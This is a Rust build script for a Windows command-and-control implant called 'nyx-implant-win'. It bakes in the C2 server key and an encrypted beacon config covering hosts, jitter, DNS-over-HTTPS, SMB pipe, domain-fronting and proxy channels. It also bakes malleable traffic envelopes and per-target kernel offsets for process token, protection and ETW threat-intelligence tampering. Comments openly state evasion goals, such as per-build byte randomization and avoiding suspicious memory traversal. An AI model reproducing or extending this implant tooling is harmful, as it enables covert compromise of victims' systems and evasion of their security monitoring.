//! Build script for nyx-implant-win.
//!
//! Two compile-time bakes:
//!
//! 1. **Team server long-term X25519 public key** (`OUT_DIR/server_pub.rs`) —
//!    see `bake_server_pub`. Source (first match wins):
//!      a. `NYX_SERVER_PUB` env (64 hex chars).
//!      b. A clearly-marked dev fallback key (NOT for production, but a real
//!         non-identity X25519 point so the ECDH doesn't collapse).
//!
//! 2. **Per-build encrypted config** (`OUT_DIR/config_blob.rs`) — see
//!    `bake_config`. Reads a TOML-ish config file (default `config.toml` next
//!    to this crate, override with `NYX_CONFIG`), serializes it into a compact
//!    binary blob (length-prefixed fields the runtime `wire::Reader` decodes),
//!    and emits a `pub static CONFIG_BLOB: &[u8] = &[...];`. At runtime
//!    `config::load()` decrypts it (via `nyx_config_macros::embed!`) and parses
//!    it back into a `Config`.
//!
//!    The blob emitted here is the PLAINTEXT; the per-build encryption happens
//!    through `embed!` in the generated file. So every rebuild re-randomizes
//!    the key/nonce/offset even if the config values are identical — the static
//!    bytes (and surrounding instruction layout) differ per build.

use std::env;
use std::fs;
use std::path::Path;

fn main() {
    println!("cargo:rerun-if-env-changed=NYX_SERVER_PUB");
    println!("cargo:rerun-if-env-changed=NYX_CONFIG");
    println!("cargo:rerun-if-env-changed=NYX_CONFIG_KEY");
    println!("cargo:rerun-if-env-changed=NYX_PROFILE");

    bake_server_pub();
    bake_config();
    bake_envelopes();
    bake_offsets();
}

// ---- 1. server pubkey -----------------------------------------------------

fn bake_server_pub() {
    let key_bytes: [u8; 32] = match env::var("NYX_SERVER_PUB") {
        Ok(hexstr) => decode_pubkey(&hexstr).unwrap_or_else(|| {
            panic!(
                "NYX_SERVER_PUB must be 64 hex chars (32 bytes); got {} chars",
                hexstr.len()
            )
        }),
        Err(_) => {
            // Development fallback: a fixed, publicly-known test keypair. This
            // is NOT secret and must NEVER be used in an engagement — but it's
            // a real (non-identity) X25519 point, so the crypto is structurally
            // exercised instead of collapsing. Real builds set NYX_SERVER_PUB.
            [
                0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
                0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42,
                0x42, 0x42, 0x42, 0x42,
            ]
        }
    };

    let out_dir = env::var("OUT_DIR").unwrap();
    let dest = Path::new(&out_dir).join("server_pub.rs");
    let mut src =
        String::from("/// Team server long-term X25519 public key, baked at build time.\n");
    src.push_str("/// See build.rs. Do not edit by hand.\n");
    src.push_str("pub static SERVER_PUB: [u8; 32] = [");
    for (i, b) in key_bytes.iter().enumerate() {
        if i > 0 {
            src.push_str(", ");
        }
        src.push_str(&format!("0x{:02X}", b));
    }
    src.push_str("];\n");
    fs::write(&dest, src).unwrap();
}

// ---- 2. per-build config --------------------------------------------------

/// The dev defaults, used when no config file is present (or a field is
/// missing). Matches the old `beacon.rs::load_config()` values so an unset
/// build behaves identically to before.
struct Defaults;
impl Defaults {
    const HOST: &'static str = "127.0.0.1";
    const PORT: u16 = 8443;
    const URI: &'static str = "/beacon";
    const SLEEP: u32 = 5;
    const JITTER: u8 = 20;
    const TLS: bool = false;
}

fn bake_config() {
    // Resolve the config file: NYX_CONFIG env, else config.toml next to
    // Cargo.toml (CARGO_MANIFEST_DIR). Missing file → all dev defaults.
    let manifest = env::var("CARGO_MANIFEST_DIR").unwrap();
    let default_path = Path::new(&manifest).join("config.toml");
    let path = match env::var("NYX_CONFIG") {
        Ok(p) => Path::new(&p).to_path_buf(),
        Err(_) => default_path,
    };

    let text = fs::read_to_string(&path).ok();
    let cfg = parse_config(text.as_deref());

    // Serialize into the binary blob the runtime `wire::Reader` decodes.
    // Layout: str(host) | u16(port) | str(uri) | u32(sleep) | u8(jitter) | u8(tls)
    //         | u8(primary_channel) | u8(fallback_bitmap)
    //         | str(doh_resolver) | str(smb_pipe_name) | str(extc2_api_host) | str(extc2_token)
    // (matches config::Config::decode). str = u32-LE length prefix + bytes.
    let mut blob: Vec<u8> = Vec::new();
    write_str(&mut blob, cfg.host.as_bytes());
    write_u16(&mut blob, cfg.port);
    write_str(&mut blob, cfg.uri.as_bytes());
    write_u32(&mut blob, cfg.sleep_seconds);
    blob.push(cfg.jitter_pct);
    blob.push(u8::from(cfg.use_tls));
    // Channel dispatcher fields (spec-1):
    blob.push(cfg.primary_channel);
    blob.push(cfg.fallback_bitmap);
    write_str(&mut blob, cfg.doh_resolver.as_bytes());
    write_str(&mut blob, cfg.smb_pipe_name.as_bytes());
    write_str(&mut blob, cfg.extc2_api_host.as_bytes());
    write_str(&mut blob, cfg.extc2_token.as_bytes());
    // HTTP enhancement fields (spec-7):
    write_str(&mut blob, cfg.rotation_hosts.as_bytes());
    write_str(&mut blob, cfg.fronting_host.as_bytes());
    write_str(&mut blob, cfg.proxy_server.as_bytes());

    let out_dir = env::var("OUT_DIR").unwrap();

    // Encrypt the plaintext config blob under a ChaCha20-Poly1305 key+nonce
    // (build.rs runs on the host, std). Emit the key/nonce/ciphertext as a Rust
    // static the runtime `config.rs` decrypts. This is the same scheme
    // `nyx_config_macros::embed!` performs, but inlined here so we avoid the
    // proc-macro's "string literal path" requirement (OUT_DIR is only known
    // via env!(), not a literal).
    //
    // Key resolution mirrors `nyx_config_macros::embed!`:
    //   - `NYX_CONFIG_KEY=<64 hex chars>` → use that 32-byte key (operator-
    //     supplied, e.g. a unique per-operator key). The nonce is STILL fresh
    //     OsRng per build — nonce reuse under a fixed key would be catastrophic.
    //   - unset → fresh OsRng key per build (legacy behaviour), but we warn so
    //     the operator knows the key rotates every build.
    //
    // Either way the key ends up embedded in the SAME binary as the ciphertext
    // — this is obfuscation, not confidentiality. See config/src/lib.rs.
    let (key, nonce, ct) = match resolve_config_key() {
        Ok(Some(custom)) => nyx_config::encrypt_with_key(&blob, custom),
        Ok(None) => {
            eprintln!(
                "cargo:warning=nyx-implant-win: NYX_CONFIG_KEY was not set — \
                 generating a fresh random config key for THIS build only. \
                 The key is embedded in the binary and recoverable; reuse across \
                 builds is NOT guaranteed. Set NYX_CONFIG_KEY=<64 hex chars> \
                 for a stable, operator-specific key."
            );
            nyx_config::encrypt(&blob)
        }
        Err(msg) => panic!("{msg}"),
    };
    let dest = Path::new(&out_dir).join("config_blob.rs");
    let mut src = String::new();
    src.push_str("/// Per-build encrypted implant config, baked by build.rs.\n");
    src.push_str("/// Do not edit by hand — key/nonce/ciphertext are baked per build.\n");
    src.push_str("pub static CONFIG_KEY: [u8; 32] = [");
    for (i, b) in key.iter().enumerate() {
        if i > 0 {
            src.push_str(", ");
        }
        src.push_str(&format!("0x{:02X}", b));
    }
    src.push_str("];\npub static CONFIG_NONCE: [u8; 12] = [");
    for (i, b) in nonce.iter().enumerate() {
        if i > 0 {
            src.push_str(", ");
        }
        src.push_str(&format!("0x{:02X}", b));
    }
    src.push_str("];\npub static CONFIG_CT: &[u8] = &[");
    for (i, b) in ct.iter().enumerate() {
        if i > 0 {
            src.push_str(", ");
        }
        src.push_str(&format!("0x{:02X}", b));
    }
    src.push_str("];\n");
    fs::write(&dest, src).unwrap();
    // Re-run if the source config file changes.
    println!("cargo:rerun-if-changed={}", path.display());
}

// ---- 3. malleable C2 envelopes (profile → baked Step/Terminator) -----------

/// When `NYX_PROFILE` is set, parse it (host-side, full nyx-profile std) and
/// emit `OUT_DIR/envelopes.rs`: Rust source reconstructing the http-post
/// **client** (request) and **server** (response) envelope shapes as
/// `nyx_profile::transform::{Step, Terminator}` values. The PIC implant then
/// applies the client shape to each POST body before send and inverts the server
/// shape on each response — making beacon traffic malleable in BOTH directions
/// without the implant pulling std (only the pure transform engine is no_std).
///
/// The implant only ever POSTs (check-in + tasking are both POST frames to one
/// URI), so only the http-post envelopes are baked. When `NYX_PROFILE` is unset,
/// a no-op envelopes.rs is emitted (empty steps, None terminator, empty UA) and
/// the transport sends raw frames — the pre-Phase-1 behaviour.
// ---- 4. kernel offsets (server-side PDB resolution → compile-time bake) -----

/// When `NYX_OFFSETS` points to an offsets.toml (produced by the server-side
/// PDB resolver from the target's ntoskrnl.pdb), bake those exact offsets as
/// compile-time constants. The resulting `OUT_DIR/kernel_offsets.rs` is
/// included by `version.rs`-adjacent code so the implant uses the target's
/// REAL offsets with ZERO runtime resolution — no pattern scan, no PDB fetch,
/// no suspicious memory traversal on the target.
///
/// When `NYX_OFFSETS` is unset (dev builds), emit a marker so the runtime
/// falls back to the `offsets_table::for_build(build_number())` lookup (which
/// covers all major Win10/11/Server builds from a built-in table).
fn bake_offsets() {
    println!("cargo:rerun-if-env-changed=NYX_OFFSETS");
    let out_dir = env::var("OUT_DIR").unwrap();
    let dest = Path::new(&out_dir).join("kernel_offsets.rs");

    let src = match env::var("NYX_OFFSETS") {
        Ok(path) => {
            let p = Path::new(&path);
            println!("cargo:rerun-if-changed={}", p.display());
            let text = fs::read_to_string(p)
                .unwrap_or_else(|e| panic!("NYX_OFFSETS={} unreadable: {e}", p.display()));
            let offsets = parse_offsets_toml(&text);
            emit_baked_offsets(&offsets)
        }
        Err(_) => {
            // No baked offsets — runtime uses the offsets_table lookup.
            String::from(
                "// Generated by build.rs — NYX_OFFSETS was unset.\n\
                 // Runtime falls back to offsets_table::for_build(build_number()).\n\
                 pub const OFFSETS_BAKED: bool = false;\n",
            )
        }
    };
    fs::write(&dest, src).unwrap();
}

/// Parsed kernel offsets from the server-side PDB resolver output.
struct KernelOffsets {
    eprocess_unique_process_id: usize,
    eprocess_active_process_links: usize,
    eprocess_token: usize,
    eprocess_image_file_name: usize,
    eprocess_signature_level: usize,
    eprocess_section_signature_level: usize,
    eprocess_protection: usize,
    etw_ti_guid_entry_to_provider_block: usize,
    etw_ti_provider_block_to_enable_info: usize,
    etw_ti_is_enabled_within_enable_info: usize,
}

/// Parse the offsets.toml format produced by the server-side PDB resolver.
/// Keys: `eprocess.unique_process_id = 0x2e0`, etc. (hex or decimal usize).
fn parse_offsets_toml(text: &str) -> KernelOffsets {
    let mut o = KernelOffsets {
        eprocess_unique_process_id: 0,
        eprocess_active_process_links: 0,
        eprocess_token: 0,
        eprocess_image_file_name: 0,
        eprocess_signature_level: 0,
        eprocess_section_signature_level: 0,
        eprocess_protection: 0,
        etw_ti_guid_entry_to_provider_block: 0,
        etw_ti_provider_block_to_enable_info: 0,
        etw_ti_is_enabled_within_enable_info: 0,
    };
    for raw in text.lines() {
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        let Some((k, v)) = line.split_once('=') else {
            continue;
        };
        let key = k.trim();
        let val = v.trim();
        // Parse as usize (hex 0x.. or decimal).
        let n = if let Some(hex) = val.strip_prefix("0x").or_else(|| val.strip_prefix("0X")) {
            usize::from_str_radix(hex, 16).unwrap_or(0)
        } else {
            val.parse::<usize>().unwrap_or(0)
        };
        match key {
            "eprocess.unique_process_id" => o.eprocess_unique_process_id = n,
            "eprocess.active_process_links" => o.eprocess_active_process_links = n,
            "eprocess.token" => o.eprocess_token = n,
            "eprocess.image_file_name" => o.eprocess_image_file_name = n,
            "eprocess.signature_level" => o.eprocess_signature_level = n,
            "eprocess.section_signature_level" => o.eprocess_section_signature_level = n,
            "eprocess.protection" => o.eprocess_protection = n,
            "etw_ti.guid_entry_to_provider_block" => o.etw_ti_guid_entry_to_provider_block = n,
            "etw_ti.provider_block_to_enable_info" => o.etw_ti_provider_block_to_enable_info = n,
            "etw_ti.is_enabled_within_enable_info" => o.etw_ti_is_enabled_within_enable_info = n,
            _ => {}
        }
    }
    o
}

/// Emit the baked offsets as Rust constants. The runtime `version.rs` (or
/// equivalent) reads these via `include!(concat!(env!("OUT_DIR"), "/kernel_offsets.rs"))`.
fn emit_baked_offsets(o: &KernelOffsets) -> String {
    format!(
        "// Generated by build.rs from NYX_OFFSETS (server-side PDB resolution).\n\
         // Do not edit — these are the target's REAL kernel offsets, baked at build time.\n\
         pub const OFFSETS_BAKED: bool = true;\n\
         pub const EPROCESS_UNIQUE_PROCESS_ID: usize = {:#x};\n\
         pub const EPROCESS_ACTIVE_PROCESS_LINKS: usize = {:#x};\n\
         pub const EPROCESS_TOKEN: usize = {:#x};\n\
         pub const EPROCESS_IMAGE_FILE_NAME: usize = {:#x};\n\
         pub const EPROCESS_SIGNATURE_LEVEL: usize = {:#x};\n\
         pub const EPROCESS_SECTION_SIGNATURE_LEVEL: usize = {:#x};\n\
         pub const EPROCESS_PROTECTION: usize = {:#x};\n\
         pub const ETW_TI_GUID_ENTRY_TO_PROVIDER_BLOCK: usize = {:#x};\n\
         pub const ETW_TI_PROVIDER_BLOCK_TO_ENABLE_INFO: usize = {:#x};\n\
         pub const ETW_TI_IS_ENABLED_WITHIN_ENABLE_INFO: usize = {:#x};\n",
        o.eprocess_unique_process_id,
        o.eprocess_active_process_links,
        o.eprocess_token,
        o.eprocess_image_file_name,
        o.eprocess_signature_level,
        o.eprocess_section_signature_level,
        o.eprocess_protection,
        o.etw_ti_guid_entry_to_provider_block,
        o.etw_ti_provider_block_to_enable_info,
        o.etw_ti_is_enabled_within_enable_info,
    )
}

fn bake_envelopes() {
    println!("cargo:rerun-if-env-changed=NYX_PROFILE");
    let src = match env::var("NYX_PROFILE") {
        Ok(path) => {
            let p = Path::new(&path);
            println!("cargo:rerun-if-changed={}", p.display());
            fs::read_to_string(p)
                .unwrap_or_else(|e| panic!("NYX_PROFILE={} unreadable: {e}", p.display()))
        }
        Err(_) => {
            let out_dir = env::var("OUT_DIR").unwrap();
            let dest = Path::new(&out_dir).join("envelopes.rs");
            fs::write(&dest, emit_envelopes_none()).unwrap();
            return;
        }
    };

    let profile =
        nyx_profile::parse(&src).unwrap_or_else(|e| panic!("NYX_PROFILE parse error: {e}"));
    let errs: Vec<_> = nyx_profile::lint(&profile)
        .into_iter()
        .filter(|d| d.severity == nyx_profile::Severity::Error)
        .collect();
    if !errs.is_empty() {
        let msgs: Vec<_> = errs
            .iter()
            .map(|d| format!("  line {}: {}", d.line, d.message))
            .collect();
        panic!(
            "NYX_PROFILE has {} lint error(s):\n{}",
            errs.len(),
            msgs.join("\n")
        );
    }

    let out_dir = env::var("OUT_DIR").unwrap();
    let dest = Path::new(&out_dir).join("envelopes.rs");
    fs::write(&dest, emit_envelopes(&profile)).unwrap();
}

/// Emit the resolved http-post client (request) + server (response) envelopes.
/// The generated source uses fully-qualified paths (no `use` imports) so there
/// are no unused-import warnings regardless of which fields a profile sets.
fn emit_envelopes(profile: &nyx_profile::Profile) -> String {
    let client = nyx_profile::post_client_envelope(profile);
    let server = nyx_profile::post_server_envelope(profile);
    // Reject terminators the PIC transport doesn't speak yet — at BUILD time so
    // the operator gets a loud failure, not a silent runtime beacon stall (the
    // F2/F5 class: implant sends body / can't read response header → retries
    // forever against a correctly-configured server).
    if let Some(nyx_profile::Terminator::Parameter(p)) = &client.terminator {
        panic!(
            "NYX_PROFILE: http-post client `parameter \"{}\";` terminator is unsupported — \
             the implant doesn't build URL query strings. Use `print;` or `header \"...\";`.",
            p
        );
    }
    if let Some(nyx_profile::Terminator::Header(h)) = &server.terminator {
        panic!(
            "NYX_PROFILE: http-post server response `header \"{}\";` terminator is unsupported — \
             the implant doesn't query response headers yet. Use `print;` so the frame rides in \
             the response body.",
            h
        );
    }
    let mut s = String::new();
    s.push_str("// Generated by build.rs from NYX_PROFILE. Do not edit by hand.\n");
    s.push_str("// http-post malleable C2 envelopes (client = request, server = response).\n\n");
    s.push_str(&format!(
        "pub static POST_CLIENT_UA: &[u8] = &{};\n",
        byte_array(client.useragent.as_deref().unwrap_or(&[]))
    ));
    s.push_str(&format!(
        "pub fn post_client_steps() -> crate::heap::Vec<nyx_profile::transform::Step> {{ {} }}\n",
        steps_expr(&client.steps)
    ));
    s.push_str(&format!(
        "pub fn post_client_terminator() -> Option<nyx_profile::transform::Terminator> {{ {} }}\n",
        terminator_expr(&client.terminator)
    ));
    s.push_str(&format!(
        "pub fn post_client_headers() -> crate::heap::Vec<(&'static [u8], &'static [u8])> {{ {} }}\n",
        headers_expr(&client.headers)
    ));
    s.push_str(&format!(
        "pub fn post_server_steps() -> crate::heap::Vec<nyx_profile::transform::Step> {{ {} }}\n",
        steps_expr(&server.steps)
    ));
    s.push_str(&format!(
        "pub fn post_server_terminator() -> Option<nyx_profile::transform::Terminator> {{ {} }}\n",
        terminator_expr(&server.terminator)
    ));
    s
}

/// No-op envelopes for builds without NYX_PROFILE: empty steps, None
/// terminator, empty UA → transport sends raw frames (pre-Phase-1 behaviour).
fn emit_envelopes_none() -> &'static str {
    "// Generated by build.rs — NYX_PROFILE was unset, so envelopes are no-ops.\n\
     // Transport sends raw frames and parses raw responses (pre-Phase-1 behaviour).\n\n\
     pub static POST_CLIENT_UA: &[u8] = &[];\n\
     pub fn post_client_steps() -> crate::heap::Vec<nyx_profile::transform::Step> { crate::heap::Vec::new() }\n\
     pub fn post_client_terminator() -> Option<nyx_profile::transform::Terminator> { None }\n\
     pub fn post_client_headers() -> crate::heap::Vec<(&'static [u8], &'static [u8])> { crate::heap::Vec::new() }\n\
     pub fn post_server_steps() -> crate::heap::Vec<nyx_profile::transform::Step> { crate::heap::Vec::new() }\n\
     pub fn post_server_terminator() -> Option<nyx_profile::transform::Terminator> { None }\n"
}

/// Render a byte slice as a Rust array literal `[0xNN, ...]`.
fn byte_array(b: &[u8]) -> String {
    let mut s = String::from("[");
    for (i, &x) in b.iter().enumerate() {
        if i > 0 {
            s.push_str(", ");
        }
        s.push_str(&format!("0x{:02X}", x));
    }
    s.push(']');
    s
}

/// Render a step list as a `crate::heap::vec![...]` expression (or `Vec::new()`).
fn steps_expr(steps: &[nyx_profile::Step]) -> String {
    if steps.is_empty() {
        return String::from("crate::heap::Vec::new()");
    }
    let parts: Vec<String> = steps
        .iter()
        .map(|st| match st {
            nyx_profile::Step::Base64 => String::from("nyx_profile::transform::Step::Base64"),
            nyx_profile::Step::Base64Url => String::from("nyx_profile::transform::Step::Base64Url"),
            nyx_profile::Step::Netbios => String::from("nyx_profile::transform::Step::Netbios"),
            nyx_profile::Step::NetbiosU => String::from("nyx_profile::transform::Step::NetbiosU"),
            nyx_profile::Step::Mask => String::from("nyx_profile::transform::Step::Mask"),
            nyx_profile::Step::Prepend(b) => format!(
                "nyx_profile::transform::Step::Prepend(crate::heap::vec!{})",
                byte_array(b)
            ),
            nyx_profile::Step::Append(b) => format!(
                "nyx_profile::transform::Step::Append(crate::heap::vec!{})",
                byte_array(b)
            ),
        })
        .collect();
    format!("crate::heap::vec![{}]", parts.join(", "))
}

/// Render an `Option<Terminator>` as a Rust expression.
fn terminator_expr(t: &Option<nyx_profile::Terminator>) -> String {
    match t {
        None => String::from("None"),
        Some(nyx_profile::Terminator::Print) => {
            String::from("Some(nyx_profile::transform::Terminator::Print)")
        }
        Some(nyx_profile::Terminator::UriAppend) => {
            String::from("Some(nyx_profile::transform::Terminator::UriAppend)")
        }
        Some(nyx_profile::Terminator::Header(name)) => format!(
            "Some(nyx_profile::transform::Terminator::Header(crate::heap::String::from({:?})))",
            name
        ),
        Some(nyx_profile::Terminator::Parameter(name)) => format!(
            "Some(nyx_profile::transform::Terminator::Parameter(crate::heap::String::from({:?})))",
            name
        ),
    }
}

/// Render static `header "N" "V";` pairs as a `vec![(&[u8], &[u8])]` expression.
fn headers_expr(h: &[(Vec<u8>, Vec<u8>)]) -> String {
    if h.is_empty() {
        return String::from("crate::heap::Vec::new()");
    }
    let parts: Vec<String> = h
        .iter()
        .map(|(n, v)| format!("(&{}[..], &{}[..])", byte_array(n), byte_array(v)))
        .collect();
    format!("crate::heap::vec![{}]", parts.join(", "))
}

struct ConfigVals {
    host: String,
    port: u16,
    uri: String,
    sleep_seconds: u32,
    jitter_pct: u8,
    use_tls: bool,
    // Channel dispatcher config (spec-1):
    primary_channel: u8,
    fallback_bitmap: u8,
    doh_resolver: String,
    smb_pipe_name: String,
    extc2_api_host: String,
    extc2_token: String,
    // HTTP channel enhancements (spec-7):
    rotation_hosts: String,
    fronting_host: String,
    proxy_server: String,
}

/// Minimal TOML-ish parser. Only understands `key = "value"` (strings) and
/// `key = <int>`/`key = true|false`. Comments (`#`) and blank lines skipped.
/// Unknown keys ignored. Missing keys fall back to Defaults.
fn parse_config(text: Option<&str>) -> ConfigVals {
    let mut host = String::from(Defaults::HOST);
    let mut port = Defaults::PORT;
    let mut uri = String::from(Defaults::URI);
    let mut sleep_seconds = Defaults::SLEEP;
    let mut jitter_pct = Defaults::JITTER;
    let mut use_tls = Defaults::TLS;
    // Channel dispatcher defaults (spec-1):
    let mut primary_channel: u8 = 0; // Https
    let mut fallback_bitmap: u8 = 0; // no fallback
    let mut doh_resolver = String::new();
    let mut smb_pipe_name = String::new();
    let mut extc2_api_host = String::new();
    let mut extc2_token = String::new();
    // HTTP enhancement (spec-7):
    let mut rotation_hosts = String::new();
    let mut fronting_host = String::new();
    let mut proxy_server = String::new();

    if let Some(t) = text {
        for raw in t.lines() {
            let line = raw.split('#').next().unwrap_or("").trim();
            if line.is_empty() {
                continue;
            }
            let Some((k, v)) = line.split_once('=') else {
                continue;
            };
            let key = k.trim();
            let val = v.trim();
            match key {
                "server_host" => {
                    if let Some(s) = unquote(val) {
                        host = s;
                    }
                }
                "beacon_uri" => {
                    if let Some(s) = unquote(val) {
                        uri = s;
                    }
                }
                "server_port" => {
                    if let Ok(n) = val.parse() {
                        port = n;
                    }
                }
                "sleep_seconds" => {
                    if let Ok(n) = val.parse() {
                        sleep_seconds = n;
                    }
                }
                "jitter_pct" => {
                    if let Ok(n) = val.parse() {
                        jitter_pct = n;
                    }
                }
                "use_tls" => {
                    if val == "true" {
                        use_tls = true;
                    } else if val == "false" {
                        use_tls = false;
                    }
                }
                "primary_channel" => {
                    if let Ok(n) = val.parse() {
                        primary_channel = n;
                    }
                }
                "fallback_bitmap" => {
                    if let Ok(n) = val.parse() {
                        fallback_bitmap = n;
                    }
                }
                "doh_resolver" => {
                    if let Some(s) = unquote(val) {
                        doh_resolver = s;
                    }
                }
                "smb_pipe_name" => {
                    if let Some(s) = unquote(val) {
                        smb_pipe_name = s;
                    }
                }
                "extc2_api_host" => {
                    if let Some(s) = unquote(val) {
                        extc2_api_host = s;
                    }
                }
                "extc2_token" => {
                    if let Some(s) = unquote(val) {
                        extc2_token = s;
                    }
                }
                "rotation_hosts" => {
                    if let Some(s) = unquote(val) {
                        rotation_hosts = s;
                    }
                }
                "fronting_host" => {
                    if let Some(s) = unquote(val) {
                        fronting_host = s;
                    }
                }
                "proxy_server" => {
                    if let Some(s) = unquote(val) {
                        proxy_server = s;
                    }
                }
                _ => {}
            }
        }
    }

    ConfigVals {
        host,
        port,
        uri,
        sleep_seconds,
        jitter_pct,
        use_tls,
        primary_channel,
        fallback_bitmap,
        doh_resolver,
        smb_pipe_name,
        extc2_api_host,
        extc2_token,
        rotation_hosts,
        fronting_host,
        proxy_server,
    }
}

/// Strip surrounding double-quotes from a TOML basic string value, if present.
fn unquote(v: &str) -> Option<String> {
    let v = v.trim();
    if v.len() >= 2 && v.starts_with('"') && v.ends_with('"') {
        Some(v[1..v.len() - 1].to_string())
    } else {
        None
    }
}

fn write_u16(buf: &mut Vec<u8>, v: u16) {
    buf.extend_from_slice(&v.to_le_bytes());
}

fn write_u32(buf: &mut Vec<u8>, v: u32) {
    buf.extend_from_slice(&v.to_le_bytes());
}

fn write_str(buf: &mut Vec<u8>, s: &[u8]) {
    write_u32(buf, s.len() as u32);
    buf.extend_from_slice(s);
}

// ---- shared helpers -------------------------------------------------------

fn decode_pubkey(s: &str) -> Option<[u8; 32]> {
    if s.len() != 64 {
        return None;
    }
    let mut out = [0u8; 32];
    for (i, chunk) in s.as_bytes().chunks(2).enumerate() {
        let hi = hex_nibble(chunk[0])?;
        let lo = hex_nibble(chunk[1])?;
        out[i] = (hi << 4) | lo;
    }
    Some(out)
}

fn hex_nibble(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}

// ---- config key resolution (mirrors nyx_config_macros::resolve_key) --------

/// Resolve the ChaCha20-Poly1305 config key from the build environment.
///
/// Returns:
/// - `Ok(Some(key))` if `NYX_CONFIG_KEY` is set and parses as 64 hex chars.
/// - `Ok(None)` if `NYX_CONFIG_KEY` is unset/empty (caller falls back to a
///   fresh random key).
/// - `Err(msg)` if `NYX_CONFIG_KEY` is set but malformed (surfaced as a
///   build failure via `panic!`).
fn resolve_config_key() -> Result<Option<[u8; 32]>, String> {
    match env::var("NYX_CONFIG_KEY") {
        Ok(raw) => {
            let trimmed = raw.trim();
            if trimmed.is_empty() {
                Ok(None)
            } else {
                parse_hex_key(trimmed).map(Some)
            }
        }
        Err(_) => Ok(None),
    }
}

/// Parse 64 hex chars into a 32-byte key. Mirrors
/// `nyx_config_macros::parse_hex_key` (no `hex` dependency).
fn parse_hex_key(s: &str) -> Result<[u8; 32], String> {
    if s.len() != 64 {
        return Err(format!(
            "NYX_CONFIG_KEY must be 64 hex chars (32 bytes), got {}",
            s.len()
        ));
    }
    let mut key = [0u8; 32];
    for (i, pair) in s.as_bytes().chunks(2).enumerate() {
        let hi = hex_nibble(pair[0])
            .ok_or_else(|| format!("NYX_CONFIG_KEY contains non-hex char {:?}", pair[0] as char))?;
        let lo = hex_nibble(pair[1])
            .ok_or_else(|| format!("NYX_CONFIG_KEY contains non-hex char {:?}", pair[1] as char))?;
        key[i] = (hi << 4) | lo;
    }
    Ok(key)
}
